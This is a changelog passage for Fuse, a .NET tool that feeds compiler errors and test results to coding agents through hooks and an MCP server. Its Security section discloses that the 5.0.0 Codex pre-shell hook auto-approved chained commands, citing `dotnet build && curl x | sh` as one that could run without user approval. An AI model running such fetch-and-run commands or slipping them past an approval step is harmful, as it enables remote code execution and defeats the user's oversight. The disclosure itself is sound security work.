- A `restore needed` answer names the project to restore in the command it prints. The command therefore also works for a project the solution leaves out.
- Hooks and the MCP server read their input as UTF-8. A repository with non-ASCII characters in its path or file names can be checked from a harness whose console uses another code page. In 5.0.0 Fuse could fail to parse the payload and report nothing.
- Git's file list and status are read as NUL-separated output. A file whose name contains a quote, backslash or control character is found and checked under its own name instead of under git's quoted spelling.
- When `git status` fails while the engine is reading changes again, after HEAD moved, a watcher error or more than 300 changed files, the engine keeps the HEAD and changed files it already knew. The next request asks git again. In 5.0.0 it had already taken the new HEAD and emptied its changed-file list, so later checks left out files changed before the failure.
- A hook payload that names an empty working directory runs in the harness's own working directory. In 5.0.0 that payload crashed the hook.
- A hook payload that is valid JSON but not an object exits with 0 and no output, with a line in `hook.log`. That is how every other internal hook failure is handled.
- A check compares declarations with each project's own preprocessor symbols, once per target framework. A declaration change inside `#if DEBUG`, `#if NET8_0_OR_GREATER` or a similar region therefore checks the files that use it. In 5.0.0 Fuse read such a region as inactive and reported no errors in its callers.
- Adding a constructor with parameters to a class that had only an implicit parameterless constructor checks every file that constructs the class. Each broken `new C()` is reported. In 5.0.0 no other file was checked.
- A change to a `using` directive inside a namespace selects the tests that reach the file's types. In 5.0.0 only a change to usings at the top of the file did.
- When a whole project is checked because more than 500 files are in reach, an analyzer error in an edited file is reported once. In 5.0.0 it could appear twice.
- In the same whole-project check, `file(s) checked` counts each source file once. It no longer adds generated files or the same file again for a second target framework.
- A request that a hook gives up on while projects are loading no longer leaves those projects out of later checks. In 5.0.0 later checks of their files could say `no errors introduced` until the next reload.
- After a commit or branch switch, the next request finishes a re-evaluation that a cancelled or failed request left undone. It reads the baseline at the new HEAD. In 5.0.0 later checks could keep comparing with the old HEAD and report errors HEAD already had as introduced.
- On Windows, a file named to `fuse check` in a different letter case from its name on disk is checked as the file git knows. In 5.0.0 Fuse looked for it at HEAD under the other spelling, found nothing, and could report errors HEAD already had as introduced.
- Renaming, moving or deleting a folder whose name contains a dot, such as `Company.Feature`, is followed like any other folder change. A project file that moved with the folder causes the projects to be evaluated again.
- A file a hook names outside the repository is left out of that request's change set. In 5.0.0 it could make git fail and drop the request's other edits.
- A file a hook names under `bin` or `obj` is left out of the change set. In 5.0.0 it could remove the generated file from the HEAD side of the check.
- A project that fails to load in the background is tried again after projects reload or after a restore. Only one background load runs at a time.
- When the engine sends an answer this client cannot read, a command prints `fuse: the Fuse engine sent an answer this client cannot read (...)` and exits with 2 instead of crashing. A hook exits with 0 and no output.
- `fuse init` names a settings file it cannot read, such as one with malformed JSON, and exits with 2 instead of crashing. An empty or comment-only settings file is treated as empty. `fuse init` leaves no temporary file behind.
- `fuse check` with an empty or invalid file argument says which argument is wrong and exits with 2 before starting the engine.

### Security

- For Codex, an answer from the pre-shell hook also approves the command. The hook rewrites only a command that is one `dotnet build` or `dotnet test` with plain arguments. It gives any other command no answer, so Codex asks you as usual. In 5.0.0 it rewrote `dotnet build` and `dotnet test` after any separator and approved the whole command line. A command such as `dotnet build && curl x | sh` could therefore run without your approval.

## 5.0.0

5.0.0 is a complete rewrite with no migration path from 4.x. Nothing 4.x wrote, including the `.fuse` folder, is read. The [changelog page](https://fuse.codes/docs/changelog#moving-from-4-x) lists what to remove before setting Fuse up again. Versions before 5.0.0 are deprecated.

Fuse keeps a warm Roslyn compilation of a .NET repository. It gives coding agents the compiler errors their edits introduced, affected-test runs, and compact build output, through agent hooks and a three-tool MCP server.

### Added

- `fuse init` registers hooks for the harnesses a repository uses: Claude Code, Cursor, Gemini CLI, Codex and GitHub Copilot CLI. It registers a plugin with OpenCode and the MCP server with VS Code.
- `fuse hook <harness> <event>` runs the hook events. A post-edit check reports only introduced errors. A pre-shell hook rewrites `dotnet build` and `dotnet test` to their Fuse equivalents. A stop check sends the agent back once while its changes leave errors HEAD did not have.
- `fuse check` reports errors in the working tree that HEAD did not have, including breaks in dependent projects. It includes errors from analyzers that can report an error.
- `fuse test` runs the tests the changes can reach. When it is safe, it runs them from a shadow copy of the last build with changed assemblies emitted in memory. `fuse test --all` runs everything. With `dotnet test` arguments, it runs exactly that scope. The output lists failures only.
- `fuse build` runs `dotnet build` and prints only errors.
- `fuse mcp` serves the `fuse_check`, `fuse_test` and `fuse_build` tools.
- One engine runs per repository. It starts on demand, runs from a private copy of its binaries, and exits after 30 idle minutes. There is nothing to configure. Fuse writes nothing inside the repository except the hook settings that `fuse init` creates.
